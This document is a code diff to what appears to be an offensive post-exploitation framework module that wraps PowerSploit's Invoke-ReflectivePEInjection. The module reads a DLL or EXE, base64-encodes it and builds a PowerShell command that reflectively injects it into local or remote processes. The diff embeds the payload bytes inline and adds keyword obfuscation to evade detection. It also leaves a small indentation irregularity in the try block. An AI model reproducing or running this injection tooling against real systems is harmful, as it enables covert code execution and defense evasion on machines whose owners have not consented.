@@ -1,8 +1,11 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
-from lib.common import helpers
+
 import base64
+from builtins import object
+from builtins import str
+
+from lib.common import helpers
+
 
 class Module(object):
 
@@ -16,6 +19,10 @@ class Module(object):
             'Description': ("Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load "
                             "a DLL/EXE in to the PowerShell process or reflectively load a DLL in to a "
                             "remote process."),
+
+            'Software': 'S0194',
+
+            'Techniques': ['T1055'],
 
             'Background' : False,
 
@@ -63,10 +70,10 @@ class Module(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'ForceASLR' : {
-                'Description'   :   'Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn\'t support ASLR.',
-                'Required'      :   True,
-                'Value'         :   'False'
+            'ForceASLR': {
+                'Description': 'Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn\'t support ASLR.',
+                'Required': True,
+                'Value': 'False'
             },
             'ComputerName' : {
                 'Description'   :   'Optional an array of computernames to run the script on.',
@@ -89,7 +96,7 @@ class Module(object):
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
@@ -114,16 +121,21 @@ class Module(object):
             if option.lower() != "agent":
                 if option.lower() == "dllpath":
                     if values['Value'] != "":
-                        try:
+                       try:
                             f = open(values['Value'], 'rb')
                             dllbytes = f.read()
                             f.close()
 
-                            base64bytes = base64.b64encode(dllbytes)
-                            scriptEnd += " -PEbase64 " + str(base64bytes)
+                            base64bytes = base64.b64encode(dllbytes).decode('UTF-8')
 
-                        except:
+                            scriptEnd = "\n$PE =  [Convert]::FromBase64String(\'" + base64bytes + "\')" + scriptEnd
+                            scriptEnd += " -PEBytes $PE"
+
+                       except:
                             print(helpers.color("[!] Error in reading/encoding dll: " + str(values['Value'])))
+                elif option.lower() == 'forceaslr':
+                    if values['Value'].lower() == "true":
+                        scriptEnd += " -" + str(option)
                 elif values['Value'].lower() == "true":
                     scriptEnd += " -" + str(option)
                 elif values['Value'] and values['Value'] != '':
@@ -132,4 +144,6 @@ class Module(object):
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
